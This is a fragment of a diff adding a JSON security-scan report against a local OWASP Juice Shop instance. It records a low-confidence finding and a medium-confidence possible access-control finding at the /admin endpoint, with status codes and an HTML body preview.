+        "false_body_length": 2526
+      },
+      "confidence": "low",
+      "response_status_true": 406,
+      "response_status_false": 406
+    },
+    {
+      "vulnerability": "Broken Access Control",
+      "subtype": "Possible privilege escalation \u2014 endpoint accessible",
+      "endpoint": "http://localhost:3000/admin",
+      "method": "GET",
+      "evidence": {
+        "status_code": 200,
+        "response_length": 9393,
+        "body_preview": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+      },
+      "confidence": "medium"
+    }
+  ]
+}
